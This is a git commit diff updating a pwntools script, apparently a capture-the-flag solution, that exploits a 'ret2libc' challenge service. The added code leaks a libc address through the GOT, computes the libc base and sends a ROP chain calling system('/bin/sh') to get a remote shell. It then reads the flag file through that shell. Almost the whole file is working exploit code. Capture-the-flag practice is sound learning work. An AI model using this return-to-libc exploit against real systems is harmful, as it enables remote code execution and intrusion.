ee56d73f2183d4af499ed91f15e3b5ba4e6f867f
yuan <ssspeed00@gmail.com>
2017-10-05 11:17:51 +0800

    CTF

--- ret2libc/flag.py
+++ ret2libc/flag.py
@@ -5,15 +5,31 @@ from pwn import *
 
 context.arch = 'amd64'
 
-host , port = 'ctf.yuawn.idv.tw' , 10100
+e = ELF('./ret2libc')
+l = ELF('./libc.so.6')
+
+host , port = 'ctf.yuawn.idv.tw' , 10106
 y = remote( host , port )
 
+y.sendlineafter( ':' , str( e.got['__libc_start_main'] ) )
+
+y.recvuntil('s 0x')
+l.address += int( y.recvline()[:-2] , 16 ) - l.symbols['__libc_start_main']
+log.success( 'libc -> {}'.format( hex( l.address ) ) )
+
+pop_rdi = 0x400853
+
 p = flat(
-    'D' * 0x18,
-    0x40063a
+    '\x00' * 0x28,
+    pop_rdi,
+    l.search( '/bin/sh\x00' ).next(),
+    l.symbols['system']
 )
 
-y.sendline( p )
+y.send( p )
 
+sleep(1)
+
+y.sendline( 'cat /home/`whoami`/flag' )
 
 y.interactive()
